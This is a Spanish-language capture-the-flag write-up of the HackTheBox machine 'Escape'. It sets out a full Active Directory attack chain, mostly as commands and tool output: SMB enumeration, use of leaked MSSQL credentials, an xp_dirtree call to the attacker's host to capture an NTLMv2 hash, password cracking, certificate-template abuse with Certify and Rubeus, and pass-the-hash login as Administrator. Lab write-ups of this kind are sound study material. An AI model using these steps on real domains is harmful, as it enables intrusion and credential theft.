---
layout: single
title: Escape - HackTheBox
excerpt: " Medium-level machine, where the 'SQL Server management studio' tool is exploited, in addition to making use of vulnerable certificates for privilege escalation. "
date: 2023-06-20
classes: wide
header:
  teaser: /blog/assets/images/htb-writeup-escape/Escape.png
  teaser_home_page: true
  icon: /blog/assets/images/htb.webp
categories:
  - hackthebox
tags:
  - Active Directory
  - Windows
  - SMB
  - Template
  - Certificate
  - Winrm
---

Medium-level machine, where the "SQL Server management studio" tool is exploited, in addition to making use of vulnerable certificates for privilege escalation.

# Summary
- IP: 10.129.165.120
- OS: Windows
- Services & Applications:

```JS
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-01 02:51:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-03-01T02:53:02+00:00; +7h59m58s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-03-01T02:53:00+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-28T23:43:21
|_Not valid after:  2053-02-28T23:43:21
|_ssl-date: 2023-03-01T02:53:02+00:00; +7h59m58s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-03-01T02:53:00+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-03-01T02:53:00+00:00; +7h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
58732/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.21.151 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49709,49714,58732 -sCV 10.129.21.151 -oN targeted
```

# Análisis de recursos compartidos con SMB:

- Enumeramos los recursos compartidos en la red utilizando el protocolo `SMB`:

```bash
$smbclient -N -L 10.129.165.120
```

```bash
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Public          Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

- Vemos que hay un directorio `"Public"`, accedemos a él y listamos su contenido:

```bash
$smbclient -N //10.129.165.120/Public
```

```bash
smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
```

- Descargamos el archivo `PDF` que encontramos y lo abrimos:

```bash
smb: \> get "SQL Server Procedures.pdf"
```

- Dentro del PDF encontramos instrucciones para gestionar una base de datos con la herramienta `"SQL Server Management Studio"`, y casi al final encontramos filtradas unas credenciales, la guardamos en un archivo "credentials.txt".


# Obtención de hash NTLMv2 usando MSSQLCLIENT:

- Accedemos a la herramienta mencionada `(mssqlclient de impacket)`, usando las credenciales encontradas:

```bash
$impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.129.165.120
```


- Dentro de `mssql`, podremos intentar acceder a recursos compartidos por `SMB`, pero en este caso, apuntaremos a uno inexistente inyectando la dirección IP de nuestra máquina atacante mientras estamos en escucha con la herramienta `"responder"`:

	- Nos ponemos en escucha:

```bash
	$responder -I tun0 -wPv
```

- Ejecutamos el comando `"xp_dirtree"` en mssqlclient para hacer esta búsqueda de archivos compartidos por SMB:

```bash
SQL> xp_dirtree '\\10.10.15.129\danteeeeee'
```

- Ahora, como se intentó entablar una conexión SMB entre la máquina víctima y nuestra máquina atacante, dentro del `responder` podremos observar como nos llegó un hash `NTLMv2`, el cual lo crackearemos con `John`:

```bash
$john -w:/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
```

- Obtenemos la credencial para el usuario `"sql_svc"`.

- Usamos este usuario y contraseña para acceder por `Winrm` a la máquina víctima:

```bash
$evil-winrm -i 10.129.165.120 -u sql_svc -p REGGIE1234ronnie
```

- Haciendo una búsqueda dentro del sistema, vemos que en el directorio "C:" existe una carpeta `"SQLServer"` y dentro de esta hay una llamada `"Logs"`, accedemos y leemos lo que hay en el archivo contenido.

- Si buscamos bien, encontraremos como intento de acceso fallido un usuario y contraseña, la cual usaremos con `Winrm` para acceder al sistema como el usuario "Ryan.Cooper":

```bash
$evil-winrm -i 10.129.165.120 -u Ryan.Cooper -p NuclearMosquito3
```

- Encontramos la primera flag en el directorio `C:\Users\Ryan.Cooper\Desktop`


#  ESCALANDO PRIVILEGIOS:



# Explotación de certificado vulnerable (template):


- Transferimos el binario de [Certify.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe) a la máquina víctima y hacemos un escaneo de `templates` vulnerables de certificados:

```
C:./Certify.exe find /vulnerable
```

```js
[!] Vulnerable Certificates Templates :
    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
```


- Como vemos, hay una template vulnerable; la usamos para obtener un certificado y su respectiva key privada con la herramienta `Certify`, pasándole como argumento el Host del certificado, el nombre de la template vulnerable y el nombre del usuario por el que nos queremos hacer pasar:


```bash
C:\Users\Ryan.Cooper\Documents> ./Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```

```js
[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

- Obtenemos el certificado y la key privada del usuario `"Aministrator"`; ahora realizamos los pasos que nos indica la misma herramienta para poder crear un archivo válido de certificado `".pfx"` el cual usaremos posteriormente para obtener el hash del usuario "Administrator"

- Guardamos el certificado y la key privada en un archivo `"cert.pem"`

- Ejecutamos el siguiente comando para generar el archivo cert.pfx:

```bash
$openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

- Creamos una contraseña para proteger el archivo .pfx y la confirmamos (en este caso "hola123").

- Con este certificado ya creado, lo transferimos a la máquina víctima y también el binario de [Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe) el cual usaremos para obtener el hash `NTLM` de "Administrator".

- En el sistema víctima, con el archivo .pfx y el binario de Rubeus descargados, ejecutamos el siguiente comando para generar las credenciales:

```bash
C:./Rubeus asktgt /user:Administrator /certificate:cert.pfx /password:hola123 /getcredentials
```

```js
[*] Getting credentials using U2U
  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```

- Usamos este hash `NTLM` para acceder via Winrm como el usuario "Administrator":

```bash
$evil-winrm -i 10.129.165.120 -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
```

- Seremos `Administrator` y podremos encontrar la última flag en el directorio `"C:\Users\Administrator\Documents> cd /Users/Administrator/Desktop"`
